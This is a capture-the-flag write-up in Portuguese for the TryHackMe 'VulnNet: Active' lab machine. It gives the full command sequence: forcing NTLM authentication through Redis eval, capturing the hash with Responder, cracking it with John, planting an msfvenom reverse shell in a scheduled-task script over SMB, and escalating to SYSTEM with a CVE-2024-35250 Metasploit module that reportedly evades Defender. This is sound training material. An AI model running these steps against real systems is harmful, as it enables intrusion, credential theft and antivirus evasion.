================================================================================
   MEU WRITEUP / COMPILADO TÉCNICO - VULNNET: ACTIVE (TRYHACKME)
================================================================================

[+] IP do Alvo: 10.66.134.49
[+] Meu IP (Kali VPN): 192.168.130.24 (Interface tun0)
[+] Domínio do Active Directory: vulnet.local

--------------------------------------------------------------------------------
1. COMO DETECTEI O ALVO (RECONHECIMENTO)
--------------------------------------------------------------------------------
Comecei rodando um escaneamento completo de portas e serviços usando o Nmap para 
mapear a superfície de ataque:

$ sudo nmap -sV -sC -T4 -p- --open 10.66.134.49

* O resultado me mostrou um ambiente padrão do Windows Active Directory com as 
  portas SMB (445) e RPC (135) ativas, mas o que me chamou a atenção foi o 
  serviço Redis aberto na porta 6379 sem autenticação.

--------------------------------------------------------------------------------
2. COMO QUEBREI O REDIS E CAPTUREI O HASH NTLMv2
--------------------------------------------------------------------------------
Percebi que o Redis aceitava comandos sem senha. Decidi abusar da função 'eval' 
do Redis para forçar o servidor Windows a tentar ler um script inexistente na 
minha máquina Kali usando um caminho UNC. Isso força o Windows a se autenticar 
comigo automaticamente via SMB.

Passo A: Deixei o Responder rodando na minha interface da VPN para pescar o hash:
$ sudo responder -I tun0 -dwvr

Passo B: Conectei no Redis do alvo e injetei o comando de rota UNC:
$ redis-cli -h 10.66.134.49
10.66.134.49:6379> eval "dofile('//192.168.130.24/compartilhamento_falso')" 0

* O Windows tentou acessar meu Kali e o Responder capturou com sucesso o hash 
  NTLMv2 do usuário 'enterprise-security'.

--------------------------------------------------------------------------------
3. QUEBRANDO A SENHA DO USUÁRIO
--------------------------------------------------------------------------------
Salvei o hash capturado em um arquivo chamado 'hash.txt' e joguei no John the 
Ripper contra a wordlist RockYou:

$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

* Consegui quebrar a senha! 
  Usuário: enterprise-security
  Senha:   sand_0873959498

--------------------------------------------------------------------------------
4. ENCONTRANDO A TAREFA AGENDADA (VETOR DE ENTRADA)
--------------------------------------------------------------------------------
Com as credenciais válidas, usei o smbclient para vasculhar as pastas públicas 
da máquina alvo:

$ smbclient //10.66.134.49/Enterprise-Share -U "enterprise-security%sand_0873959498" -W vulnet.local

* Lá dentro, listei os arquivos e achei um script chamado 
  'PurgeIrrelevantData_1826.ps1'. Deduzi na hora que o Windows executava esse 
  arquivo periodicamente através de uma tarefa agendada do sistema.

--------------------------------------------------------------------------------
5. CONSOLIDANDO O ACESSO INICIAL COM METASPLOIT (REVERSE SHELL)
--------------------------------------------------------------------------------
Em vez de usar uma shell manual simples que o antivírus pegaria, montei um plano 
para injetar um payload do Metasploit no lugar daquele script.

Passo A: Usei o MSFvenom para gerar uma reverse shell em PowerShell e salvei com 
o mesmo nome do arquivo original:
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.130.24 LPORT=4444 -f psh-reflection > PurgeIrrelevantData_1826.ps1

Passo B: Abri o Metasploit e deixei o Multi/Handler esperando a conexão:
msfconsole > use exploit/multi/handler
msfconsole > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msfconsole > set LHOST 192.168.130.24
msfconsole > set LPORT 4444
msfconsole > run

Passo C: Voltei no smbclient e dei um 'put' para substituir o arquivo original:
smb: \> put PurgeIrrelevantData_1826.ps1

* Aguardei cerca de 2 minutos, a tarefa agendada do Windows rodou meu arquivo e 
  abriu a minha primeira sessão de Meterpreter!
* Naveguei até o Desktop e capturei a Flag de Usuário:
  -> THM{------------------------------------------}

--------------------------------------------------------------------------------
6. ESCALADA DE PRIVILÉGIOS (BYPASS DO WINDOWS DEFENDER)
--------------------------------------------------------------------------------
Mandei a minha sessão de usuário para o background. Inicialmente tentei alguns 
exploits comuns sugeridos pelo Metasploit (como o CVE-2022-21882), mas o Windows 
Defender barrou as alterações de memória e derrubou minha shell.

Para burlar o antivírus, mudei a estratégia para um exploit mais recente e bem 
mais silencioso: o CVE-2024-35250, que abusa de uma vulnerabilidade lógica em 
um driver oficial do Windows (ks.sys).

Configurei o módulo no Metasploit apontando para a minha sessão atual e mudando 
a porta de retorno para não dar conflito:

msfconsole > use exploit/windows/local/cve_2024_35250_ks_driver
msfconsole > set SESSION 1
msfconsole > set LHOST 192.168.130.24
msfconsole > set LPORT 5555
msfconsole > run

* O exploit funcionou perfeitamente! Ele injetou o código através do driver, 
  passou batido pelo Windows Defender e me abriu uma nova sessão do Meterpreter.
* Chequei meus privilégios imediatos: 'getuid' retornou NT AUTHORITY\SYSTEM.

--------------------------------------------------------------------------------
7. PEGANDO A FLAG FINAL
--------------------------------------------------------------------------------
Como esse laboratório limpa os processos agressivamente a cada poucos minutos, 
fui direto ao ponto e li a flag do root direto pela memória do Meterpreter:

meterpreter > cat "C:\\Users\\Administrator\\Desktop\\root.txt"

* THM{------------------------------------------}
================================================================================
